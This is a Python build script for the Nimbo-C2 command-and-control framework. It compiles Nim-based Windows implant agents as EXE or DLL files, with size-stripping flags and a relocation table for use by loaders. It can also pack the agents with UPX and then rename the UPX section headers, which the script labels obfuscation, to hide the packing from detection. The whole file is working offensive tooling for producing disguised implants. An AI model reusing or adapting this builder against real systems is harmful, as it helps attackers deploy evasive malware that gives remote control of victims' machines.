try:
    # when executed by Nimbo-C2
    from builder import config2agent
except ModuleNotFoundError:
    # when executed directly
    import config2agent

import os
import sys
import argparse
import subprocess
from jsonc_parser.parser import JsoncParser

# compiler args
nim_exe_cmd = "nim compile --app:console"
nim_dll_cmd = "nim compile --app:lib --nomain"
nim_global_flags = " --cpu=amd64"                     # for windows 64 bit
nim_global_flags += " -d=mingw"                       # for cross compiling from linux
nim_global_flags += " -d:danger -d:strip --opt:size"  # for size
nim_global_flags += " --passL:-Wl,--dynamicbase"      # for relocation table (needed for loaders)
nim_in_out = " -o:OUT_FILE SRC_FILE"

# nimbo root folder
nimbo_root = os.path.realpath(os.path.join(os.path.dirname(__file__), ".."))
# parse config
config = JsoncParser.parse_file(os.path.join(nimbo_root, "config.jsonc"))
# agent files folder
agent_files = os.path.join(nimbo_root, "agent")
# exe file
exe_file = os.path.join(agent_files, "exe.nim")
# dll file
dll_file = os.path.join(agent_files, "dll.nim")
# default output files
default_exe = os.path.join(nimbo_root, config["agent"]["exe"]["agent_filename"])
default_dll = os.path.join(nimbo_root, config["agent"]["dll"]["agent_filename"])
# upx command
upx_cmd = "UPX_BIN OUT_BIN"
upx_sections = {
    b"UPX0": b"MIG4",
    b"UPX1": b"MIG5"
}


def pack_upx(upx_bin, binary):
    global upx_cmd
    upx_cmd = upx_cmd.replace("UPX_BIN", upx_bin).replace("OUT_BIN", binary)
    # upx the agent
    ret = subprocess.run(upx_cmd, capture_output=True, shell=True)
    if ret.returncode != 0:
        print("[-] ERROR: Could not UPX the agent")
        return
    else:
        print(f"[+] UPXed the agent")

    # rename upx pe sections
    try:
        with open(binary, "rb") as f:
            agent = f.read()
        for section in upx_sections:
            agent = agent.replace(section, upx_sections[section])
        with open(binary, "wb") as f:
            f.write(agent)
        print("[+] Obfuscated UPX section names")
    except:
        print("[-] ERROR: Could not obfuscate UPX section names")


def build_exe(args):
    if not args.output:
        args.output = default_exe
    # create agent config
    config2agent.create_config(is_exe=True)

    # compile
    compile_cmd = nim_exe_cmd + nim_global_flags + \
                  nim_in_out.replace("OUT_FILE", args.output).replace("SRC_FILE", exe_file)
    ret = subprocess.run(compile_cmd, capture_output=True, shell=True)
    if ret.returncode != 0:
        print("[-] ERROR: Could not compile")
        return
    else:
        print(f"[+] Compiled successfully to {args.output}")

    # pack
    if args.upx:
        pack_upx(args.upx, args.output)


def build_dll(args):
    if not args.output:
        args.output = default_dll

    # create agent config
    config2agent.create_config(is_exe=False)

    # replace export-name in dll.nim
    with open(dll_file, "rt") as f:
        dll_to_compile = f.read().replace("DLL_EXPORT_NAME", args.export_name)
    with open(dll_file, "wt") as f:
        f.write(dll_to_compile)

    # compile
    compile_cmd = nim_dll_cmd + nim_global_flags + \
                  nim_in_out.replace("OUT_FILE", args.output).replace("SRC_FILE", dll_file)
    ret = subprocess.run(compile_cmd, capture_output=True, shell=True)
    if ret.returncode != 0:
        print("[-] ERROR: Could not compile")
    else:
        print(f"[+] Compiled successfully to {args.output}")

    # revert export-name in dll.nim
    with open(dll_file, "rt") as f:
        dll_template = f.read().replace(args.export_name, "DLL_EXPORT_NAME")
    with open(dll_file, "wt") as f:
        f.write(dll_template)

    # pack
    if args.upx:
        pack_upx(args.upx, args.output)


def main():
    parser = argparse.ArgumentParser(prog="build", description="Nimbo-C2 agent builder")
    sub_parsers = parser.add_subparsers(dest="payload_type", help='payload types')

    parser_exe = sub_parsers.add_parser('exe', help='build exe agent')
    parser_exe.add_argument("-o", "--output", metavar="<path>", help="output path")
    parser_exe.add_argument("-x", "--upx", action="store_true",
                            help="pack using upx, and override upx section names")

    parser_dll = sub_parsers.add_parser('dll', help='build dll agent')
    parser_dll.add_argument("-o", "--output", metavar="<path>", help="output path")
    parser_dll.add_argument("-x", "--upx", action="store_true",
                            help="pack using upx, and override upx section names")
    parser_dll.add_argument("-e", "--export-name", metavar="<name>", type=str,
                            help="dll export name", default=config["agent"]["dll"]["export_name"])

    args = parser.parse_args()

    if args.upx:
        args.upx = config["builder"]["upx_path"]

    getattr(sys.modules[__name__], "build_" + args.payload_type)(args)


if __name__ == '__main__':
    main()
